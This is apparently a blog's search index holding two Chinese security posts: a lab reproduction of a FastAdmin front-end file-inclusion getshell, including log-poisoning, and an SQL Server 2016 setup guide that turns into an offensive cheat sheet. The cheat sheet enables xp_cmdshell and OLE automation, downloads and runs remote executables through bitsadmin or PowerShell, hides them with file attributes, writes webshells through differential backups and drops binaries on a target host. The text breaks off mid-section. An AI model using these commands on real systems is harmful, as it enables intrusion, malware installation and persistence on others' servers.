<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>FastAdmin前台文件包含Getshell复现分析</title>
      <link href="/2021/03/25/fastadmin-qian-tai-wen-jian-bao-han-getshell-fu-xian-fen-xi/"/>
      <url>/2021/03/25/fastadmin-qian-tai-wen-jian-bao-han-getshell-fu-xian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p>影响版本：<br>Windows V1.0.0.20180911_beta - V1.0.0.20200506_beta</p><p>利用条件：<br>WIndows ，开启前台用户中心 usercenter=&gt;true</p><h4 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h4><p><i class="far fa-hand-point-right"></i> 漏洞环境：<br>phpstudy + nginx +mysql + composer + V1.0.0.20190510_beta</p><p>使用phpstudy安装composer，将composer和php加入环境变量：<br><img src="https://i.loli.net/2021/03/25/VJUKj9NFPEn4Czy.png" alt="Image"></p><p>然后进入到源码目录中，使用 composer 安装依赖：</p><pre><code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/composer install </code></pre><p><img src="https://i.loli.net/2021/03/25/ALDf5HYzS1IjCNO.png"></p><p><i class="far fa-hand-point-right"></i> phpstudy设置数据库账号密码(root/159357),设置网站根目录为fastadmin/pubic</p><p><i class="far fa-hand-point-right"></i> 设置nginx和php配置文件 以支持thinphp pathinfo：<br>php.ini =&gt;  cgi.fix_pathinfo=1<br>nginx.config（默认已配置） =&gt;<br><img src="https://i.loli.net/2021/03/25/RcAiqZjKxo1GN4z.png"><br>灰色那句是隐藏掉index.php(index)</p><p><i class="far fa-hand-point-right"></i> 访问web/insatll.php进行安装<br>安装完成后查看版本：<br><img src="https://i.loli.net/2021/03/25/xNlw8OeCyrScbRF.png"></p><p><i class="far fa-hand-point-right"></i> 开启tp调试模式<br>\application\config.php  21行<br><img src="https://i.loli.net/2021/03/25/KjohmN6sBCEWF4b.png"></p><p><i class="far fa-hand-point-right"></i> 漏洞利用<br>默认开启：usercenter=&gt;true<br><img src="https://i.loli.net/2021/03/25/wAFPqBagYcGXdrS.png"><br>注册用户访问个人中心：<br> <img src="https://i.loli.net/2021/03/25/3c5lHXmYafGeIKE.png"><br>修改头像位置进行头像上传：<br> <img src="https://i.loli.net/2021/03/25/cDzGLsHJKAYXwa2.png"></p><p><i class="far fa-hand-point-right"></i> 文件包含(利用上传时返回的头像路径，这里直接是建了个文件来测试)</p><pre><code>http://192.168.238.128/index/user/_empty?name=../../public/uploads/1.txt</code></pre><p> <img src="https://i.loli.net/2021/03/25/pLhUwnR1JDHyk8I.png"><br><img src="https://i.loli.net/2021/03/25/wpb7i4NLHYV9Skv.png"></p><h4 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h4><p>主要分析以下两个文件：</p><pre><code>\application\index\controller\User.php\thinkphp\library\think\view\driver\Think.php</code></pre><p>\application\index\controller\User.php<br><img src="https://i.loli.net/2021/03/25/FJAdUcRiutMr8HI.png"><br>User.php中存在一个_empty方法,接收一个name参数, </p><pre><code>//钩子函数，不管$data = Hook::listen("user_request_empty", $name);        foreach ($data as $index =&gt; $datum) {            $this-&gt;view-&gt;assign($datum);        }</code></pre><pre><code>//拼接user/$name进行模板渲染：return $this-&gt;view-&gt;fetch('user/' . $name);</code></pre><p>$name可控，再看thinkphp中”\thinkphp\library\think\view\driver\Think.php”fetch的实现：<br> <img src="https://i.loli.net/2021/03/25/k7RryEBuAdSt3Tv.png"><br>在代码中通过is_file()用来判断模板文件是否存在：</p><pre><code>if (!is_file($template)) {            throw new TemplateNotFoundException('template not exists:' . $template, $template);        }</code></pre><p>在这里修改代码传入robots.txt文件进行测试：<br><img src="https://i.loli.net/2021/03/25/KIcRiSO3F9zk6pW.png"><br><img src="https://i.loli.net/2021/03/25/WYenSOmHAghG7qt.png"><br>可以看到文件存在，对于is_file()函数，在Linux下用它来判断类似于/xxx/../etc/passwd文件时，如果xxx是不存在的目录，则会返回false；而在windows下 ，这个目录存在与否，只要满足../穿越后能访问到对应文件，均返回true,如下：<br> <img src="https://i.loli.net/2021/03/25/9zcjhIQ8B3qNonk.png"><br>看到源码中的fetch(‘user/‘ . $name)，这个user的目录在uoloads下不存在，那么在windows下就可以用../来跳过这个不存在的目录进行模板注入！网站根目录在pubic下，使用一层../即可跳出：<br> <img src="https://i.loli.net/2021/03/25/alTH1puCIRmYjPO.png"><br>而在linux中，如果没有存在的目录 is_file始终返回false：<br> <img src="https://i.loli.net/2021/03/25/vie6RECUDZK8qNj.png"></p><h4 id="4-填坑之日志文件包含Getshell"><a href="#4-填坑之日志文件包含Getshell" class="headerlink" title="4.填坑之日志文件包含Getshell"></a>4.填坑之日志文件包含Getshell</h4><p>在第7步因为环境问题,上传头像失败，那我们可以通过thinkphp的日志文件包含来getshell，通过观察在 runtime\log\202103\24.log 下存在日志文件，文件夹命名为 年/月 ，日志文件命名为日期.log，同时可以发现访问不存在的文件触发403后，日志文件会记录完整的请求信息，在cookie中插入payload：<br> <img src="https://i.loli.net/2021/03/25/s6gWw5znd7pxYrX.png"><br> <img src="https://i.loli.net/2021/03/25/4IefjvtwJnpOUxo.png"></p><pre><code>//然后构造以下payload:/index/user/_empty?name=../../runtime/log/202103/24.log</code></pre><p> <img src="https://i.loli.net/2021/03/25/3HsnC81DLbEtBUz.png"></p><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h4><ol><li>环境搭建过程的配置</li><li>is_file()函数在特殊情况下的返回值</li><li>其他的文件包含getshell</li></ol><h4 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h4><p><a href="https://www.cnpanda.net/codeaudit/777.html">https://www.cnpanda.net/codeaudit/777.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FastAdmin </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLServer2016安装配置和渗透利用</title>
      <link href="/2020/11/13/sqlserver2016-de-an-zhuang-he-shi-yong/"/>
      <url>/2020/11/13/sqlserver2016-de-an-zhuang-he-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>先下载SQLServer2016-x64-CHS.iso镜像和 SQL Server Management Studio (SSMS)，注意SSMS和SQLServer的版本要一致。(下载链接<a href="https://pan.baidu.com/s/1EYjNeL4QP5pFFBi34xD1Bw">https://pan.baidu.com/s/1EYjNeL4QP5pFFBi34xD1Bw</a> 提取码：6666 )</p><h2 id="二-快速的安装配置过程"><a href="#二-快速的安装配置过程" class="headerlink" title="二.快速的安装配置过程"></a>二.快速的安装配置过程</h2><p>1.下载好的iso镜像用压缩工具解压:<br><img src="https://i.loli.net/2020/11/13/9qbitpLkcZ1vKMC.png"></p><p>2.双击setup.exe进入安装界面,版本可以选择Developer，大部分默认，下一步：<br><img src="https://i.loli.net/2020/11/13/BqECNyKIOWTkj4o.png"></p><p><img src="https://i.loli.net/2020/11/13/HvoejWGVMsnEc4I.png"></p><p>3.功能选择，我这里是看着说明随便选的：<br><img src="https://i.loli.net/2020/11/13/FkGl2V3Aou6MOnz.png"></p><p>4.这个位置选择自动：<br><img src="https://i.loli.net/2020/11/13/7rHco3heka5jJLM.png"></p><p>5.配置sa的密码和管理员：<br><img src="https://i.loli.net/2020/11/13/TMVuSNwRQKJ7IeW.png"></p><p><img src="https://i.loli.net/2020/11/13/Gu9MhFzWEXdfpYJ.png"></p><p>6.安装SSMS<br><img src="https://i.loli.net/2020/11/13/3eYiKIEVjshwBJz.png"></p><p>7.把这个图标复制到桌面上方便操作：<br><img src="https://i.loli.net/2020/11/13/4nPZIgzfAXtqLH7.png"></p><p>8.这个时候还不能外部链接去管理，现在1433没开：<br><img src="https://i.loli.net/2020/11/13/vGSReML5n82msOb.png"></p><p>9.然后找到这个配置管理，在里面打开TCP/TP协议：<br><img src="https://i.loli.net/2020/11/13/vrLVgKadU29OGlT.png"></p><p>10.现在可以外部连接和管理了：<br><img src="https://i.loli.net/2020/11/13/Rxdkm634XGiUVQA.png"></p><p><img src="https://i.loli.net/2020/11/13/CmOV38ecynlirKE.png"></p><p><img src="https://i.loli.net/2020/11/13/8E7hUbyxJBgFT1W.png"></p><p>11.下面来进行数据库还原，选择备份的.bak源，选择后在下面的备份集里可以设置数据库存储位置。磁盘空间一定要给够(我这次的还原操作，3.5gb的7z文件-&gt;解压成50G.bak文件-&gt;还原成100G的数据库文件，然后还把磁盘写爆了，磁盘显示空间0kb,那个条都不见了。。 <i class="fas fa-poo"></i>。。）<br><img src="https://i.loli.net/2020/11/13/muFMSPo3s2W5Nzb.png"></p><p><img src="https://i.loli.net/2020/11/13/mYkxCisTowBVKMA.png"></p><h2 id="三-Sqlserver渗透"><a href="#三-Sqlserver渗透" class="headerlink" title="三.Sqlserver渗透"></a>三.Sqlserver渗透</h2><h3 id="Sqlserver存储过程利用"><a href="#Sqlserver存储过程利用" class="headerlink" title="Sqlserver存储过程利用"></a>Sqlserver存储过程利用</h3><p>(1).xp_cmdshell命令执行<br>查询框输入一下语句来查看数据库信息和系统版本：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证是否为sa权限：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> IS_SRVROLEMEMBER<span class="token punctuation">(</span><span class="token string">'sysadmin'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断目标机的MSSQL服务是否存在<code>xp_cmdshell</code>扩展存储过程：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/12/01/czKJbG9XrvAtR46.png"><br>启用xp_cmdshell扩展：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">USE</span> master <span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment" spellcheck="true">-- 启用配置设置</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span><span class="token number">1</span>   <span class="token comment" spellcheck="true">-- 启用xp_cmdshell</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span> <span class="token comment" spellcheck="true">-- 关闭配置设置</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行命令：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">Exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'whoami'</span><span class="token punctuation">;</span><span class="token keyword">Exec</span> xp_cmdshell <span class="token string">'netstat -ano'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>关闭xp_cmdshell扩展：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">USE</span> master <span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载文件执行(进行文件下载时可能会被av拦截；执行exe可能会导致当前查询卡住,需要exe创建新进程执行后退出，或者cs上线后注入到其他进程后exit)：<br>bitsadmin:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">exec</span> xp_cmdshell "cmd <span class="token operator">/</span><span class="token number">c</span> bitsadmin <span class="token operator">/</span>transfer myDownLoadJob <span class="token operator">/</span>download <span class="token operator">/</span>priority normal 'http:<span class="token comment" spellcheck="true">//xxx/xxx.exe'  'C:\\xxx.exe'";</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerShell WebClient(Win 7 +)：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">exec</span> xp_cmdshell "powershell <span class="token punctuation">(</span>new<span class="token operator">-</span>object Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span>'https:<span class="token comment" spellcheck="true">//xxx/xxx.exe','C:\\xxx.exe')";</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">"cmd /c move C:\\xxx.exe C:\\Users\\xxx.exe"</span><span class="token punctuation">;</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">"cmd /c attrib +S +H C:\Users\xxx.exe"</span><span class="token punctuation">;</span><span class="token keyword">exec</span> xp_cmdshell <span class="token string">"cmd /c C:\Users\xxx.exe"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PowerShell Invoke-WebRequest (Win 8+,如果上面的不行就用这个)：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">exec</span> xp_cmdshell <span class="token string">"powershell wget 'https:/xxx/xxx.exe' -outfile 'C:\\xxx.exe'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从xplog70.dll恢复被删除的xp_cmdshell</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">exec</span> sp_addextendedproc xp_cmdshell<span class="token punctuation">,</span><span class="token string">'xplog70.dll'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2) COM组件sp_oacreate和sp_oamethod<br>如果无法使用xp_cmdshell执行命令，可以使用SP_OAcreate创建 OLE 对象wscript.shell,查看SP_OACREATE是否开启:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span> <span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span> <span class="token string">'SP_OACREATE'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将赋对象给变量@a，然后使用SP_OAMETHOD调用@a的属性(WScript.Shell对象)run执行命令，命令执行成功输出0,没有回显：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@a</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@a</span> output <span class="token keyword">exec</span> sp_oamethod <span class="token variable">@a</span><span class="token punctuation">,</span> <span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">'cmd.exe /c whoami > E:\\3.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/11/30/hJURWwMGXbsxvZE.png"></p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@a</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@a</span> <span class="token keyword">out</span><span class="token keyword">exec</span> sp_oamethod <span class="token variable">@a</span><span class="token punctuation">,</span> <span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe help > E:\\33.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/11/30/UtgGrBam3IpuLHl.png"><br>执行失败的情况:<br><img src="https://i.loli.net/2020/11/30/GOcjLMqwVenE1F7.png"><br>如果想要回显，可以将命令执行结果读入临时表，通过查询临时表来获得间接回显：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">Create</span> <span class="token keyword">TABLE</span> <span class="token comment" spellcheck="true">#tmp(info VARCHAR(400),ID int IDENTITY (1, 1) NOT NULL)</span><span class="token comment" spellcheck="true">--创建一个临时表tmp来存储信息</span><span class="token keyword">DECLARE</span> <span class="token variable">@shell</span> <span class="token keyword">INT</span><span class="token keyword">DECLARE</span> <span class="token variable">@fso</span> <span class="token keyword">INT</span><span class="token keyword">DECLARE</span> <span class="token variable">@file</span> <span class="token keyword">INT</span><span class="token keyword">DECLARE</span> <span class="token variable">@isEnd</span> <span class="token keyword">BIT</span><span class="token keyword">DECLARE</span> <span class="token variable">@out</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token keyword">EXEC</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output<span class="token keyword">EXEC</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'cmd.exe /c whoami /priv > E:\\temp.txt'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'true'</span><span class="token comment" spellcheck="true">--写文件用 E:\\xx\\形式。</span><span class="token comment" spellcheck="true">--WScript.Shell Run ,返回值为0或1,为成功和失败两个状态;</span><span class="token comment" spellcheck="true">--第一个参数是要执行的程序的路径,若路径中存在空格要用""括起来;第二个参数是设置窗口状态,0是隐藏窗口;第三个参数为true则等待当前命令执行完成。</span><span class="token comment" spellcheck="true">--</span><span class="token comment" spellcheck="true">--var objShell</span><span class="token comment" spellcheck="true">--var objShell= new ActiveXObject("WScript.Shell")</span><span class="token comment" spellcheck="true">--var iReturnCode=objShell.Run("cmd.exe /c whoami",0,true)</span><span class="token keyword">EXEC</span> sp_oacreate <span class="token string">'scripting.filesystemobject'</span><span class="token punctuation">,</span><span class="token variable">@fso</span> output<span class="token keyword">EXEC</span> sp_oamethod <span class="token variable">@fso</span><span class="token punctuation">,</span><span class="token string">'opentextfile'</span><span class="token punctuation">,</span><span class="token variable">@file</span> <span class="token keyword">out</span><span class="token punctuation">,</span><span class="token string">'E:/temp.txt'</span>   <span class="token comment" spellcheck="true">--因为fso的opentextfile方法将返回一个textstream对象，所以此时@file是一个对象令牌</span><span class="token keyword">WHILE</span> <span class="token variable">@shell</span><span class="token operator">></span><span class="token number">0</span><span class="token keyword">BEGIN</span>                         <span class="token keyword">EXEC</span> sp_oamethod <span class="token variable">@file</span><span class="token punctuation">,</span><span class="token string">'Readline'</span><span class="token punctuation">,</span><span class="token variable">@out</span> <span class="token keyword">out</span>  <span class="token comment" spellcheck="true">--开启循环，使用Readline读取文件</span><span class="token keyword">Insert</span> <span class="token keyword">INTO</span> <span class="token comment" spellcheck="true">#tmp(info) VALUES (@out)        --将@out中的数据插入到 #tmp 表 info 字段中</span><span class="token keyword">EXEC</span> sp_oagetproperty <span class="token variable">@file</span><span class="token punctuation">,</span><span class="token string">'AtEndOfStream'</span><span class="token punctuation">,</span><span class="token variable">@isEnd</span> <span class="token keyword">out</span>    <span class="token comment" spellcheck="true">--读取到文件末尾,设置end标记。</span><span class="token keyword">IF</span> <span class="token variable">@isEnd</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">BREAK</span>                                         <span class="token comment" spellcheck="true">--读完文件退出循环。</span><span class="token keyword">ELSE</span> <span class="token keyword">CONTINUE</span><span class="token keyword">END</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token comment" spellcheck="true">#tmp                          -- 查询#tmp表</span><span class="token comment" spellcheck="true">--删除临时表</span><span class="token keyword">if</span> object_id<span class="token punctuation">(</span>'tempdb<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">#tmp') is not null   --删除临时表</span>     <span class="token keyword">begin</span>         <span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token comment" spellcheck="true">#tmp </span>    <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/12/01/yNmQIqjbDalFTB8.png"></p><p>如果提示被禁止了，那么使用sp_configure来开启：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/11/30/c6wh523fZzqKAXU.png"><br>关闭：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(2).沙盘模式提权(xp_cmdshell和xplog70.dll无法使用时，xp_regread和xp_regwrite,需要修改注册表，利用access表进行命令执行)<br>xp_regread查询远程端口：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">exec</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_regread <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token string">'SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'</span><span class="token punctuation">,</span><span class="token string">'PortNumber'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/12/01/96MDaOr85kGzlSI.png"><br>查询远程桌面拒绝连接设置是否开启(1,开启；0关闭),为1则拒绝远程连接：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">exec</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_regread <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token string">'SYSTEM\CurrentControlSet\Control\Terminal Server'</span><span class="token punctuation">,</span><span class="token string">'fDenyTSConnections'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/12/01/iw2Ya9nQeJR85hH.png"><br>xp_regwrite开启远程桌面连接(权限为nt service\mssqlserver,需要system)：<br>拒绝访问。</p><p>差异备份geshell:<br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">https://www.cnblogs.com/PANDA-Mosen/p/13283204.html</a><br><a href="http://qhadronj.blog.sohu.com/23612737.html">http://qhadronj.blog.sohu.com/23612737.html</a><br><a href="http://www.adminxe.com/1029.html">http://www.adminxe.com/1029.html</a><br><a href="https://www.cnblogs.com/chillsrc/archive/2008/12/10/1346054.html">https://www.cnblogs.com/chillsrc/archive/2008/12/10/1346054.html</a><br><a href="http://by-y.blog.sohu.com/84281503.html">http://by-y.blog.sohu.com/84281503.html</a><br><a href="https://www.cnblogs.com/xred/archive/2011/12/31/2308724.html">https://www.cnblogs.com/xred/archive/2011/12/31/2308724.html</a><br><a href="http://www.voidcn.com/article/p-blymdvju-bgh.html">http://www.voidcn.com/article/p-blymdvju-bgh.html</a><br><a href="https://blog.csdn.net/inject2006/article/details/1784136">https://blog.csdn.net/inject2006/article/details/1784136</a><br><a href="https://blog.csdn.net/weixin_41598660/article/details/105330290">https://blog.csdn.net/weixin_41598660/article/details/105330290</a><br><a href="https://www.cnblogs.com/xred/archive/2011/12/31/2308724.html">https://www.cnblogs.com/xred/archive/2011/12/31/2308724.html</a></p><p>backup database test to disk = ‘E:\bak.bak’ ;<br>create table test..shell(a image)–<br>;insert into test..shell(a) values (0x3c)–     //插入一句话木马到表中，注意16进制<br>;backup database test to disk = ‘E:\shell.asp’ with differential , format ;–    //进行差异备份</p><p>exec sp_addextendedproc ‘sp_oacreate’ ,’odsole70.dll’<br>exec sp_addextendedproc ‘sp_oadestroy’, ‘odsole70.dll’<br>exec sp_addextendedproc ‘sp_oagetproperty’, ‘odsole70.dll’<br>exec sp_addextendedproc ‘sp_oamethod’, ‘odsole70.dll’<br>exec sp_addextendedproc ‘sp_oasetproperty’, ‘odsole70.dll’<br>exec sp_addextendedproc ‘sp_oastop’, ‘odsole70.dll’<br>exec sp_addextendedproc ‘xp_regaddmultistring’, ‘xpstar.dll’<br>exec sp_addextendedproc ‘xp_regdeletekey’, ‘xpstar.dll’<br>exec sp_addextendedproc ‘xp_regdeletevalue’, ‘xpstar.dll’<br>exec sp_addextendedproc ‘xp_regenumvalues’, ‘xpstar.dll’<br>exec sp_addextendedproc ‘xp_regread’, ‘xpstar.dll’<br>exec sp_addextendedproc ‘xp_regremovemultistring’, ‘xpstar.dll’<br>exec sp_addextendedproc ‘xp_regwrite’, ‘xpstar.dll’</p><p><a href="https://blog.csdn.net/weixin_33768481/article/details/91512489">https://blog.csdn.net/weixin_33768481/article/details/91512489</a><br><a href="https://www.cnblogs.com/chillsrc/archive/2008/12/10/1346054.html">https://www.cnblogs.com/chillsrc/archive/2008/12/10/1346054.html</a><br>第一句开启沙盘模式：<br>exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1<br>利用jet.oledb执行系统命令：<br>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=ias\dnary.mdb’,’select shell(“cmd.exe /c CMD命令”)’)<br>或者<br>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=ias\ias.mdb’,’select shell(“cmd.exe /c CMD命令 “)’)<br>但是,当 X:\Windows\System32\ias\dnary.mdb 或 X:\Windows\System32\ias\ias.mdb 被删除时,命令就会无效了.</p><p>所以利用以下语句创建一个数据库：(数据库名SysSetup.xml,后缀.xml是自定义,不影响使用.)</p><p>declare @hr int;<br>declare @object int;declare @property int;<br>exec @hr = sp_OACreate ‘ADOX.Catalog’,@object OUTPUT;<br>exec @hr = sp_OAMethod @object,’Create’,@property output,’Provider=Microsoft.Jet.OLEDB.4.0;Data Source=SysSetup.xml’;<br>然后再利用jet.oledb调用SysSetup.xml执行系统命令：<br>select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database=SysSetup.xml’,’select shell(“cmd.exe /c CMD命令”)’)<br>2, 直接写入文件到对方计算机,此处的文件可以是exe, dll,等.(注,此方法不支持文件大于64KB)<br>当已经有一个程序需要放到对方计算机的时候.(例如, 放MA。)<br>DECLARE @ObjectToken INT<br>EXEC sp_OACreate ‘ADODB.Stream’, @ObjectToken OUTPUT<br>EXEC sp_OASetProperty @ObjectToken, ‘Type’, 1<br>EXEC sp_OAMethod @ObjectToken, ‘Open’<br>EXEC sp_OAMethod @ObjectToken, ‘Write’, NULL, 0x123456(其中0x123456为HEX内容)<br>EXEC sp_OAMethod @ObjectToken, ‘SaveToFile’, NULL, ‘Test.exe(文件名)’, 2<br>EXEC sp_OAMethod @ObjectToken, ‘Close’<br>EXEC sp_OADestroy @ObjectToken</p><p>写入之后, 就发挥你的办法去执行你写入的这个文件就OK了。</p><p>将这个文件转成HEX代码。</p><p>如果不知道怎么把文件转成HEX代码,请使用下面的工具.</p><p>File2Hex.rar </p><p>使用方法很简单, 解压出来之后, 把要转的文件拖到脚本上去, 就会生成包含HEX代码的文本.</p><p>然后用以下方法写入到对方计算机中。</p><p>(3).注册表映像劫持提权</p><p>MSSQL注入时通过Agent 